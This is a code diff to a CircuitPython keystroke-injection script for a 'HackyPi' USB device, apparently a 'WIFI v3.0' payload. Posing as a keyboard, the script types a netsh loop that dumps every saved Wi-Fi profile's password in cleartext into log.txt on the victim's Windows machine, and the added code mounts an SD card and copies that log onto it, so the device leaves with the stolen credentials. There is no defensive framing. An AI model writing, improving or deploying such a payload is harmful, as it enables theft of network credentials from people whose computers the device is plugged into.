@@ -9,6 +9,17 @@ from adafruit_display_text.label import Label
 from adafruit_hid.keyboard import Keyboard, Keycode
 from adafruit_st7789 import ST7789
 from keyboard_layout_win_uk import KeyboardLayout
+import storage
+import adafruit_sdcard
+
+SD_CS = board.GP17
+
+# Connect to the card and mount the filesystem.
+spi = busio.SPI(board.GP18, board.GP19, board.GP16)
+cs = digitalio.DigitalInOut(board.GP17)
+sdcard = adafruit_sdcard.SDCard(spi, cs)
+vfs = storage.VfsFat(sdcard)
+storage.mount(vfs, "/sd")
 
 # Constants for the display
 BORDER = 12
@@ -79,7 +90,7 @@ def save_file_in_current_directory(file_name, command, keyboard_layout):
 # Initial screen setup
 inner_rectangle()
 print_onTFT("HackyPi", 50, 40)
-print_onTFT("WIFI v2.1", 30, 80)
+print_onTFT("WIFI v3.0", 30, 80)
 time.sleep(3)
 
 try:
@@ -104,11 +115,6 @@ try:
     keyboard.send(Keycode.ENTER)
     time.sleep(0.5)
 
-    #Retrieve Wi-Fi profiles and save details to file
-    keyboard_layout.write("netsh wlan show profiles > profiles.txt")
-    keyboard.send(Keycode.ENTER)
-    time.sleep(0.5)
-
     #Retrieve Wi-Fi passwords and save to file
     keyboard_layout.write('for /f "skip=9 tokens=1,2 delims=:" %i in (\'netsh wlan show profiles\') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear >> log.txt')
     keyboard.send(Keycode.ENTER)
@@ -120,13 +126,22 @@ try:
     time.sleep(0.5)
         
     inner_rectangle()
-    print_onTFT("Files Created!!", 40, 80)
+    print_onTFT("Files", 70, 40)
+    print_onTFT("Created", 50, 80)
+    time.sleep(3)
+    
+    # Copy file to sd card
+    src = "log.txt"
+    dst = "/sd/log.txt"
+    with open(src, "r") as src_file:
+        with open(dst, "w") as dst_file:
+            dst_file.write(src_file.read())
     
 except Exception as ex:
     keyboard.release_all()
     raise ex
 
 inner_rectangle()
-print_onTFT("Execution", 30, 40)
-print_onTFT("Complete", 40, 80)
+print_onTFT("Execution", 40, 40)
+print_onTFT("Complete", 50, 80)
 time.sleep(3)
